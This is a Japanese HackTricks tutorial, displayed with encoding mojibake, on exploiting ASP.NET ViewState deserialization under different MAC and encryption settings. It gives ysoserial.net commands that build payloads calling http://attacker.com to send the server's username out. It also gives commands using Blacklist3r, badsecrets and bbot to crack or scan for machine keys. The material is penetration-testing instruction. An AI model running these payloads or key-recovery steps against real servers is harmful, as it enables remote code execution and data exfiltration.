# \_\_VIEWSTATEã®ç§˜å¯†ã‚’çŸ¥ã‚‰ãšã«æ‚ªç”¨ã™ã‚‹

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ãƒã‚§ãƒƒã‚¯ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã™ã‚‹ã€‚

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚­ãƒ£ãƒªã‚¢**ã«èˆˆå‘³ãŒã‚ã‚Šã€ãƒãƒƒã‚­ãƒ³ã‚°ã§ããªã„ã‚‚ã®ã‚’ãƒãƒƒã‚¯ã—ãŸã„æ–¹ - **æ¡ç”¨ä¸­ã§ã™ï¼** (_æµæš¢ãªãƒãƒ¼ãƒ©ãƒ³ãƒ‰èªã®èª­ã¿æ›¸ããŒå¿…è¦ã§ã™_).

{% embed url="https://www.stmcyber.com/careers" %}

## ViewStateã¨ã¯

**ViewState**ã¯ã€ASP.NETãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãŒãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ä½¿ç”¨ã™ã‚‹æ–¹æ³•ã§ã€**ãƒšãƒ¼ã‚¸é–“ã§ãƒšãƒ¼ã‚¸ã¨ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ã®å€¤ã‚’ä¿æŒã™ã‚‹**ãŸã‚ã«ä½¿ã‚ã‚Œã¾ã™ã€‚ãƒšãƒ¼ã‚¸ã®HTMLãŒãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã‚‹ã¨ã€ãƒšãƒ¼ã‚¸ã®ç¾åœ¨ã®çŠ¶æ…‹ã¨ãƒã‚¹ãƒˆãƒãƒƒã‚¯ä¸­ã«ä¿æŒã™ã‚‹å¿…è¦ãŒã‚ã‚‹å€¤ãŒã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã€base64ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸæ–‡å­—åˆ—ã«å¤‰æ›ã•ã‚Œã€ViewStateã®éš ã—ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«å‡ºåŠ›ã•ã‚Œã¾ã™ã€‚\
ViewStateæƒ…å ±ã«é©ç”¨ã•ã‚Œã‚‹ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¾ãŸã¯ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®çµ„ã¿åˆã‚ã›ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™:

* Base64
* EnableViewStateMacã¨ViewStateEncryptionModeå±æ€§ã‚’falseã«è¨­å®šã™ã‚‹ã“ã¨ã§å®šç¾©å¯èƒ½
* Base64 + MAC (ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸èªè¨¼ã‚³ãƒ¼ãƒ‰) æœ‰åŠ¹
* EnableViewStateMacå±æ€§ã‚’trueã«è¨­å®šã™ã‚‹ã“ã¨ã§å®šç¾©å¯èƒ½
* Base64 + æš—å·åŒ–
* viewStateEncryptionModeå±æ€§ã‚’trueã«è¨­å®šã™ã‚‹ã“ã¨ã§å®šç¾©å¯èƒ½

## **ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹**

![](<../../.gitbook/assets/image (309) (2).png>)

### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹1: EnableViewStateMac=false ãŠã‚ˆã³ viewStateEncryptionMode=false

`AspNetEnforceViewStateMac`ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼ã‚’ä»¥ä¸‹ã®å ´æ‰€ã§ã‚¼ãƒ­ã«è¨­å®šã™ã‚‹ã“ã¨ã«ã‚ˆã‚Šã€ViewStateMACã‚’å®Œå…¨ã«ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**ViewStateå±æ€§ã®ç‰¹å®š**

BurpSuiteã‚’ä½¿ç”¨ã—ã¦ã“ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å«ã‚€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã™ã‚‹ã“ã¨ã§ã€ViewStateãŒMACã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/1.0.png)

ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒMACã§ä¿è­·ã•ã‚Œã¦ã„ãªã„å ´åˆã€[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)ã‚’ä½¿ç”¨ã—ã¦ãã‚Œã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ 1.5 â€“ ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ 1ã¨åŒã˜ã§ã™ãŒã€ViewStateã‚¯ãƒƒã‚­ãƒ¼ã¯ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰é€ä¿¡ã•ã‚Œã¾ã›ã‚“

é–‹ç™ºè€…ã¯ã€HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ä¸€éƒ¨ã¨ã—ã¦**ViewState**ã‚’å‰Šé™¤ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã“ã®ã‚¯ãƒƒã‚­ãƒ¼ã‚’å—ã‘å–ã‚Šã¾ã›ã‚“ï¼‰ã€‚\
**ViewState**ãŒ**å­˜åœ¨ã—ãªã„**å ´åˆã€ViewStateã®é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã«ä¼´ã†æ½œåœ¨çš„ãªè„†å¼±æ€§ã‹ã‚‰å®Ÿè£…ãŒ**å®‰å…¨**ã§ã‚ã‚‹ã¨è€ƒãˆã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
ã—ã‹ã—ã€ãã‚Œã¯é•ã„ã¾ã™ã€‚ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒœãƒ‡ã‚£ã«**ViewStateãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼**ã‚’è¿½åŠ ã—ã€ysoserialã‚’ä½¿ç”¨ã—ã¦ä½œæˆã—ãŸã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã™ã‚‹ã¨ã€**ã‚±ãƒ¼ã‚¹ 1**ã§ç¤ºã•ã‚ŒãŸã‚ˆã†ã«**ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ**ã‚’é”æˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹: 2 â€“ .Net < 4.5 ãŠã‚ˆã³ EnableViewStateMac=true & ViewStateEncryptionMode=false

**ç‰¹å®šã®ãƒšãƒ¼ã‚¸**ã§**ViewState MAC**ã‚’**æœ‰åŠ¹**ã«ã™ã‚‹ãŸã‚ã«ã¯ã€ç‰¹å®šã®aspxãƒ•ã‚¡ã‚¤ãƒ«ã§ä»¥ä¸‹ã®å¤‰æ›´ã‚’è¡Œã†å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å…¨ä½“ã«å¯¾ã—ã¦ã‚‚ã€ä»¥ä¸‹ã«ç¤ºã™ã‚ˆã†ã« **web.config** ãƒ•ã‚¡ã‚¤ãƒ«ã§è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```markup
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒMACã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€æ”»æ’ƒã‚’æˆåŠŸã•ã›ã‚‹ã«ã¯ã¾ãšä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚­ãƒ¼ãŒå¿…è¦ã§ã™ã€‚ã“ã®å ´åˆã€BurpSuiteãŒãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒMACã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’æ•™ãˆã¦ãã‚Œã¾ã™ï¼š

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.0.png)

ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚­ãƒ¼ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã€[**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)ã‚’è©¦ã—ã¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
```markdown
![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.1.png)

[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) ã¯æ—¢çŸ¥ã® machineKeys ã‚’è­˜åˆ¥ã§ãã‚‹åˆ¥ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚Python ã§æ›¸ã‹ã‚Œã¦ã„ã‚‹ãŸã‚ã€Blacklist3r ã¨ã¯ç•°ãªã‚Šã€Windows ã«ä¾å­˜ã—ã¾ã›ã‚“ã€‚.NET viewstates ã«ã¯ã€ã€Œpython blacklist3rã€ã¨ã„ã†ãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ãŒã‚ã‚Šã€ã“ã‚Œã‚’ä½¿ç”¨ã™ã‚‹æœ€ã‚‚é€Ÿã„æ–¹æ³•ã§ã™ã€‚

viewstate ã¨ generator ã‚’ç›´æ¥æŒ‡å®šã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
```markdown
![](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

ã¾ãŸã¯ã€ç›´æ¥ã‚¿ãƒ¼ã‚²ãƒƒãƒˆURLã«æ¥ç¶šã—ã€HTMLã‹ã‚‰viewstateã‚’åˆ‡ã‚Šå–ã‚ã†ã¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
```markdown
![](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

å¤§è¦æ¨¡ã«è„†å¼±ãªviewstatesã‚’æ¢ã™ãŸã‚ã«ã€ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³åˆ—æŒ™ã¨ä½µç”¨ã—ã¦ã€`badsecrets` [**BBOT**](exploiting-__viewstate-parameter.md)ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã§ãã¾ã™:
```
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
```markdown
![](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

ã‚‚ã—é‹ãŒè‰¯ãã¦éµãŒè¦‹ã¤ã‹ã£ãŸã‚‰ã€[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:** ã‚’ä½¿ã£ã¦æ”»æ’ƒã‚’é€²ã‚ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ `_VIEWSTATEGENERATOR` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ãŒ**é€ä¿¡ã•ã‚Œãªã„**å ´åˆã€`--generator` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã‚’**æä¾›ã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€ã“ã‚Œã‚‰ã¯å¿…è¦ã§ã™**ï¼š
```bash
--apppath="/" --path="/hello.aspx"
```
### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ï¼š3 - .Net < 4.5 ãŠã‚ˆã³ EnableViewStateMac=true/false ãŠã‚ˆã³ ViewStateEncryptionMode=true

ã“ã®ã‚±ãƒ¼ã‚¹ã§ã¯ã€Burpã¯ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒMACã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’èªè­˜ã§ãã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€å€¤ã¯ãŠãã‚‰ãæš—å·åŒ–ã•ã‚Œã¦ãŠã‚Šã€è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã¯**Machine KeyãŒå¿…è¦ã§ã™**ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/3.0.png)

**ã“ã®å ´åˆã€**[**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)**ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯é–‹ç™ºä¸­ã§ã™...**

**.NET 4.5ã‚ˆã‚Šå‰ã§ã¯**ã€ASP.NETã¯**`ViewStateEncryptionMode`**ãŒ_**Always**_ã«è¨­å®šã•ã‚Œã¦ã„ã¦ã‚‚ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã®**æš—å·åŒ–ã•ã‚Œã¦ã„ãªã„**\_`__VIEWSTATE`\_ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’**å—ã‘å…¥ã‚Œã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚ASP.NETã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã®**`__VIEWSTATEENCRYPTED`**ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®**å­˜åœ¨**ã®ã¿ã‚’**ãƒã‚§ãƒƒã‚¯ã—ã¾ã™**ã€‚ã“ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å‰Šé™¤ã—ã€æš—å·åŒ–ã•ã‚Œã¦ã„ãªã„ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã™ã‚‹ã¨ã€ãã‚Œã§ã‚‚å‡¦ç†ã•ã‚Œã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€MachinekeyãŒæ—¢çŸ¥ã§ã‚ã‚‹å ´åˆï¼ˆä¾‹ãˆã°ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã®å•é¡Œã‚’é€šã˜ã¦ï¼‰ã€**ã‚±ãƒ¼ã‚¹2**ã§ä½¿ç”¨ã•ã‚ŒãŸ[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ViewStateã®é€†ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã—ãŸRCEã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

* ViewStateã®é€†ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‹ã‚‰`__VIEWSTATEENCRYPTED`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å‰Šé™¤ã—ã¾ã™ã€‚ãã†ã§ãªã‘ã‚Œã°ã€Viewstate MACæ¤œè¨¼ã‚¨ãƒ©ãƒ¼ãŒè¿”ã•ã‚Œã€å›³ã«ç¤ºã™ã‚ˆã†ã«æ‚ªç”¨ãŒå¤±æ•—ã—ã¾ã™ï¼š

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/3.1.png)

### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ï¼š4 - .Net >= 4.5 ãŠã‚ˆã³ EnableViewStateMac=true/false ãŠã‚ˆã³ ViewStateEncryptionMode=true/false ãŸã ã—ã€ä¸¡æ–¹ã®å±æ€§ãŒfalseã®å ´åˆã‚’é™¤ã

ä»¥ä¸‹ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’web.configãƒ•ã‚¡ã‚¤ãƒ«å†…ã«æŒ‡å®šã™ã‚‹ã“ã¨ã§ã€ASP.NETãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®ä½¿ç”¨ã‚’å¼·åˆ¶ã§ãã¾ã™ã€‚ä¸‹è¨˜ã®ã‚ˆã†ã«ç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚
```markup
<httpRuntime targetFramework="4.5" />
```
ã“ã®æ“ä½œã¯ã€web.configãƒ•ã‚¡ã‚¤ãƒ«ã®`machineKey`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å†…ã§ä»¥ä¸‹ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æŒ‡å®šã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ã‚‚å®Ÿè¡Œã§ãã¾ã™ã€‚
```bash
compatibilityMode="Framework45"
```
å‰ã®ã‚±ãƒ¼ã‚¹ã¨åŒæ§˜ã«ã€Burpã¯**å€¤ãŒæš—å·åŒ–ã•ã‚Œã¦ã„ã‚‹**ãŸã‚ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒMACä¿è­·ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’è­˜åˆ¥ã—ã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€**æœ‰åŠ¹ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã«ã¯ã€æ”»æ’ƒè€…ã¯ã‚­ãƒ¼ãŒå¿…è¦ã§ã™**ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.0.png)

ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚­ãƒ¼ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã€[**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)ã‚’è©¦ã—ã¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
IISDirPathãŠã‚ˆã³TargetPagePathã®è©³ç´°ãªèª¬æ˜ã«ã¤ã„ã¦ã¯ã€[ã“ã¡ã‚‰ã‚’å‚ç…§ã—ã¦ãã ã•ã„](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.1.png)

ã¾ãŸã¯ã€[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)ã‚’ä½¿ç”¨ã—ã¦ï¼ˆgeneratorå€¤ä»˜ãã§ï¼‰ï¼š
```
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
```markdown
![](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

æœ‰åŠ¹ãªMachine keyãŒç‰¹å®šã•ã‚ŒãŸã‚‰ã€**æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—ã¯** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) **ã‚’ä½¿ç”¨ã—ã¦ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ã§ã™**
```
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
`__VIEWSTATEGENERATOR` ã®å€¤ãŒã‚ã‚‹å ´åˆã€ãã®å€¤ã‚’ `--generator` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¨ã—ã¦ **ä½¿ç”¨** ã—ã€`--path` ã¨ `--apppath` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ **çœç•¥** ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

ViewStateã®é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã®è„†å¼±æ€§ãŒæˆåŠŸè£ã«æ‚ªç”¨ã•ã‚Œã‚‹ã¨ã€æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’å«ã‚€ãƒãƒ³ãƒ‰å¤–ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å—ä¿¡ã—ã¾ã™ã€‚[æˆåŠŸã—ãŸæ‚ªç”¨ã®PoC](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)

### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹6 â€“ ViewStateUserKeysãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹

**ViewStateUserKey** ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ã€**CSRFæ”»æ’ƒ**ã«å¯¾ã—ã¦**é˜²å¾¡**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚ãã®ã‚ˆã†ãªã‚­ãƒ¼ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§å®šç¾©ã•ã‚Œã¦ãŠã‚Šã€ä»Šã¾ã§è­°è«–ã—ãŸæ–¹æ³•ã§ **ViewState** ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚ˆã£ã¦ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯å‡¦ç†ã•ã‚Œã¾ã›ã‚“**ã€‚\
æ­£ã—ããƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½œæˆã™ã‚‹ãŸã‚ã«ã¯ã€ã‚‚ã†ä¸€ã¤ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### æˆåŠŸã—ãŸæ”»æ’ƒã®çµæœ <a href="#poc" id="poc"></a>

ã™ã¹ã¦ã®ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ã«ãŠã„ã¦ã€ViewState YSoSerial.Net ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒ**æˆåŠŸ**ã™ã‚‹ã¨ã€ã‚µãƒ¼ãƒãƒ¼ã¯ "**500 Internal server error**" ã¨å¿œç­”ã—ã€å¿œç­”å†…å®¹ã« "**ã“ã®ãƒšãƒ¼ã‚¸ã®çŠ¶æ…‹æƒ…å ±ã¯ç„¡åŠ¹ã§ã‚ã‚Šã€ç ´æã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**" ã¨è¡¨ç¤ºã•ã‚Œã€ä»¥ä¸‹ã®å›³ã«ç¤ºã™ã‚ˆã†ã« OOB ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒå¾—ã‚‰ã‚Œã¾ã™ï¼š

